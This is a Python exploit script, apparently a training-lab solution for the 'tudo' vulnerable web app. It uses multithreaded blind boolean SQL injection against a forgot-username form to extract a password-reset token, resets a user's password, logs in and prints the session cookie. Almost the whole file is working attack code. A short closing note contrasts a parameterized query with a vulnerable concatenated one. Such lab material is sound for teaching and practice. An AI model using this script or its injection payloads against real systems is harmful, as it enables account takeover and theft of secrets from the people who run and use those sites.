#!/usr/bin/python3

import requests
import urllib3
import logging
import sys
from time import sleep
import string
import  concurrent.futures
import  sys
from itertools import repeat
import threading

logging.basicConfig(level=logging.INFO, format='%(asctime)s:%(levelname)s:%(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
http_proxy = "http://127.0.0.1:8080"
proxyDict = {"http":http_proxy}
pattern_string = ">User exists!<"

# Define Functions
def type_print(output):
    for x in output:
        print(x, end='')
        sys.stdout.flush()
        sleep(0.04)
    sleep(1)


def enum_row_values(num_of_table_rows, query_table, column_name, index):
    for printableCharacter in string.printable:

        #payload = {'username':'admin\' and (select uid from users where username=\'user1\')=\'2'}
        # payload = {'username':'admin\' and AND ((SELECT SUBSTRING(token,1,1) from tokens) limit 1 offset 1)=\'T'}
        #payload = {'username':'admin\' and (select token from tokens where uid=\'2\')=\'T8sQgf8vXyuu1cc7Zl9N2fR0y4ypSLxw'}
        
        query = f" AND ((SELECT SUBSTRING({column_name},{index},1) from {query_table}) limit 1 offset {num_of_table_rows})=\'{printableCharacter}"
        payload = {'username':f'admin\'{query}'}
        response = session.post('http://172.17.0.2/forgotusername.php', data=payload)#, proxies=proxyDict)

        if pattern_string in response.text:
            #print(f"{printableCharacter}")
            return str(printableCharacter)
            break

def num_of_table_rows(query_table):
    for table_row_count in list(range(1,40)):

        query = f" AND (select count(*) from {query_table})=\'{table_row_count}"
        payload = {'username':f'admin\'{query}'}

        response = session.post('http://172.17.0.2/forgotusername.php', data=payload)#, proxies=proxyDict)

        if pattern_string in response.text:
            return table_row_count
            break


def display_reset_token(num_of_table_rows):

    num_of_table_rows = num_of_table_rows - 1

    ## Find the character length of the table being looped on.
    value_char_length = 32

    ## Find the name of the table being looped on by using the lenght of the table and the iterator as inputs.
    with concurrent.futures.ThreadPoolExecutor() as executor:
        ## Note this is how you pass two agruments to a function in this map call: iterator surrounded by repeat and the number of times to perform the operation dicted by the table_char_length value + 1.
        row_value_letters = executor.map(enum_row_values, repeat(num_of_table_rows), repeat('tokens'), repeat('token'), list(range(1,value_char_length+1)))
    ## Dipslay the name of the table being looped.
    row_value_name = ''
    for letter in row_value_letters:
        row_value_name += letter
    #print(f"{row_value_name}")

    return row_value_name

# 1. Establish Session
type_print('1. Establishing Session.\n\n')

session = requests.Session()

# 2. Send a Test HTTP Request to web root.
response = session.get('http://172.17.0.2/')

if int(response.status_code) == 200:
    type_print("2. Web root accessible.\n\n")
else:
    type_print("2. Web adddress not accessible.")
    type_print(str(response.status_code) + "\n\n")
    sys.exit("...Exiting")

# 3. Force a token reset to be generated.
type_print('3. Generating a password reset token in the database.\n\n')

response = session.post('http://172.17.0.2/forgotpassword.php',data={'username': 'user1'})#, proxies=proxyDict)

# 4. Find the number of rows in the token reset database so that we can find the last row value which is the token we just generated.
type_print('4. Finding the number of rows in the token reset database.\n')

num_of_table_rows = num_of_table_rows("tokens")

type_print(f"4. Number of table rows is: {num_of_table_rows}\n\n")

# 5. Dipslay the reset token for the last entry in the token reset table.
type_print('5. Figuring out value of the reset token. This should take ~10 seconds and ignore any errors that get dispalyed.\n')

reset_token = display_reset_token(num_of_table_rows)

type_print(f"5. Token reset token for user1 is: {reset_token}\n\n")

# 6. Reset password for user1.
type_print("6. Resetting the password for user1.\n")

response = session.post('http://172.17.0.2/resetpassword.php', data={'token': reset_token, 'password1': 'test', 'password2': 'test'})#, proxies=proxyDict)

type_print("6. Reset password for user1 to \"test\".\n\n")

# 7. Test login with new password.
type_print("7. Testing login with new user1 password of test.\n")

response = session.post('http://172.17.0.2/login.php', data={'username': 'user1', 'password': 'test'})#, proxies=proxyDict)

if ">Login Failes<" in response.text:
    type_print("XXX --- Beans, that didn't work :( --- XXX")
    sys.exit("...Exiting")
else:
    authenticated_session_ID = session.cookies.get_dict()
    type_print(f"7. Login successful! Cookie value is: {authenticated_session_ID['PHPSESSID']}\n\n")




# https://github.com/bmdyy/tudo/blob/main/solution/dump_token.py

#NOTES
## Good user parameter in SQL query using PHP and Postgres:
### $ret = pg_prepare($db, "checkuser_query", "select * from users where username = $1");
### $ret = pg_execute($db, "checkuser_query", array($_POST['username']));
## Bad user parameter in SQL query using PHP and Postgres:
### $ret = pg_query($db, "select * from users where username='".$username."';");